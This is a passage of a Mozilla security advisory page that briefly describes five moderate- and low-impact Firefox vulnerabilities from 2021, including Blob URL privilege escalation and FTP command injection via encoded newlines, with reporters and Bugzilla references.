#### [#CVE-2021-23999: Blob URLs may have been granted additional privileges](#CVE-2021-23999)

Reporter
Nika Layzell
Impact
moderate
##### Description

If a Blob URL was loaded through some unusual user interaction, it could have been loaded by the System Principal and granted additional privileges that should not be granted to web content.

##### References

* [Bug 1691153](https://bugzilla.mozilla.org/show_bug.cgi?id=1691153)

#### [#CVE-2021-24002: Arbitrary FTP command execution on FTP servers using an encoded URL](#CVE-2021-24002)

Reporter
Daniel Santos
Impact
moderate
##### Description

When a user clicked on an FTP URL containing encoded newline characters (%0A and %0D), the newlines would have been interpreted as such and allowed arbitrary commands to be sent to the FTP server.

##### References

* [Bug 1702374](https://bugzilla.mozilla.org/show_bug.cgi?id=1702374)

#### [#CVE-2021-29945: Incorrect size computation in WebAssembly JIT could lead to null-reads](#CVE-2021-29945)

Reporter
Christian Holler
Impact
moderate
##### Description

The WebAssembly JIT could miscalculate the size of a return type, which could lead to a null read and result in a crash.

*Note: This issue only affected x86-32 platforms. Other platforms are unaffected.*

##### References

* [Bug 1700690](https://bugzilla.mozilla.org/show_bug.cgi?id=1700690)

#### [#CVE-2021-29946: Port blocking could be bypassed](#CVE-2021-29946)

Reporter
Frederik Braun
Impact
low
##### Description

Ports that were written as an integer overflow above the bounds of a 16-bit integer could have bypassed port blocking restrictions when used in the Alt-Svc header.

##### References

* [Bug 1698503](https://bugzilla.mozilla.org/show_bug.cgi?id=1698503)

#### [#CVE-2021-29948: Race condition when reading from disk while verifying signatures](#CVE-2021-29948)

Reporter
Cure53
Impact
low
##### Description

Signatures are written to disk before and read during verification, which might be subject to a race condition when a malicious local process or user is replacing the file.

##### References

* [Bug 1692899](https://bugzilla.mozilla.org/show_bug.cgi?id=1692899)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


